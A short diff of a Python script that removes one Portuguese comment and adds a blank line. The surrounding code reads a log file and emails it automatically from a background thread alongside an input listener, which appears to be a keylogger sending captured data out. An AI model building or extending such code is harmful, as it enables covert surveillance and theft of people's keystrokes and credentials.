@@ -42,7 +42,6 @@ def email_send():
             msg['To'] = destination_email
             msg['Subject'] = 'Arquivo automático'
 
-            # Lê e anexa o log
             with open(log_file, 'rb') as f:
                 part = MIMEBase('application', 'octet-stream')
                 part.set_payload(f.read())
@@ -72,4 +71,5 @@ listener.start()
 threading.Thread(target=email_send, daemon=True).start()
 
 listener.join()
+
 
